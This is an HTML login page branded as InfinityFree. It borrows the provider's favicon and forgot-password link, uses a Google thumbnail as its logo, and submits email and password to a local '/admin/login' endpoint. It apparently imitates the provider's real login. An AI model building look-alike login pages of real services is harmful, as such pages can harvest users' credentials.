<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="Content-Language" content="en">

    <link rel="icon" href="https://dash.infinityfree.com/images/favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="https://dash.infinityfree.com/images/favicon.ico" type="image/x-icon">

    <title>Login to Your Account - InfinityFree</title>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

    <style>
        body {
            background: linear-gradient(to right, #007bff, #6c757d);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            font-family: 'Roboto', sans-serif;
        }

        .container {
            max-width: 400px;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-weight: 600;
            color: #333;
        }

        .form-control {
            border-radius: 20px;
            box-shadow: none;
            border: 1px solid #ced4da;
            transition: border-color 0.3s;
        }

        .form-control:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }

        .btn-primary {
            border-radius: 20px;
            background-color: #007bff;
            border: none;
            transition: background-color 0.3s;
        }

        .btn-primary:hover {
            background-color: #0056b3;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
        }

        .footer a {
            color: #007bff;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: red;
            font-size: 0.9em;
            margin-top: 10px;
            display: none; /* Hidden by default */
        }

        .password-toggle {
            cursor: pointer;
            position: absolute;
            right: 10px;
            top: 38px;
            font-size: 16px;
            color: #007bff;
        }

        .logo {
            display: flex;
            justify-content: center;
        }

        .form-label-description {
            margin-left: auto; /* Ensure the link stays on the right */
            font-size: 0.9em; /* Optional: adjust the font size */
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">
            <h1 class="navbar-brand">
                <a href="ebook">
                    <img src="https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcQmpSgQCz_2bIxsyzOvGwrObT4PlS-4CTMV_jQbEDHtCwzV615a" alt="InfinityFree" style="height: 120px;">
                </a>
            </h1>
        </div>
        <form action="/admin/login" method="post" autocomplete="off" id="login-form">
            <input type="hidden" name="_token" value="1e4ELyTaBY1PB50JyvxJo0wOPrbA0kRekn3LfQXg" autocomplete="off">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" class="form-control" placeholder="you@example.com" name="email" id="email" required aria-label="Email Address">
            </div>
            <div class="form-group position-relative">
                <label for="password" class="d-flex justify-content-between align-items-center">
                    <span>Password</span>
                    <span class="form-label-description">
                        <a href="https://dash.infinityfree.com/forgot-password">I forgot my password</a>
                    </span>
                </label>
                <input type="password" class="form-control" placeholder="Password" required id="password" name="password" aria-label="Password">
                <span class="password-toggle" onclick="togglePasswordVisibility()">üëÅÔ∏è</span>
            </div>
            <div class="form-check">
                <input type="checkbox" class="form-check-input" name="remember" id="remember">
                <label class="form-check-label" for="remember">Keep me logged in</label>
            </div>
            <button type="submit" class="btn btn-primary btn-block" id="submit-btn">Login</button>
            <div id="error-message" class="error-message">Invalid email or password. Please try again.</div>
        </form>
        <div class="footer">
            <a href="/terms-of-service" target="_blank">Terms of Service</a> | 
            <a href="/privacy-policy" target="_blank">Privacy Policy</a>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('password');
            const toggleButton = document.querySelector('.password-toggle');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleButton.textContent = 'üôà'; // Hide icon
            } else {
                passwordInput.type = 'password';
                toggleButton.textContent = 'üëÅÔ∏è'; // Show icon
            }
        }

        document.getElementById('login-form').addEventListener('submit', function(event) {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Example validation (you can implement real validation logic here)
            if (!email || !password) {
                event.preventDefault();
                document.getElementById('error-message').textContent = 'Email and Password are required.';
                document.getElementById('error-message').style.display = 'block';
            } else {
                // Hide error message on valid submission
                document.getElementById('error-message').style.display = 'none';
            }
        });
    </script>
</body>

</html>
